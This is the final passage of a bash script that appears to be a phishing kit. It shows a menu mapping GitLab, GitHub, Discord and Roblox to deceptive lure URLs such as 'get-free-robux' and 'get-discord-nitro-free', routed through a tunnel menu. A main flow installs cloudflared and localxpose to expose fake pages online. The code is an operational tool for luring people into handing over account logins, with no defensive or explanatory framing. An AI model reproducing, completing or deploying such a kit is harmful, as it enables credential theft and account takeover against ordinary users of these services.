		32) website="gitlab"; mask='https://get-1k-followers-on-gitlab-free'; tunnel_menu;;
		33) website="github"; mask='https://get-1k-followers-on-github-free'; tunnel_menu;;
		34) website="discord"; mask='https://get-discord-nitro-free'; tunnel_menu;;
		35) website="roblox"; mask='https://get-free-robux'; tunnel_menu;;
		99) about;;
		0 | 00) msg_exit;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again...${RESET}"; sleep 1; main_menu;;
	esac
}

# --- Main Execution Flow ---
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
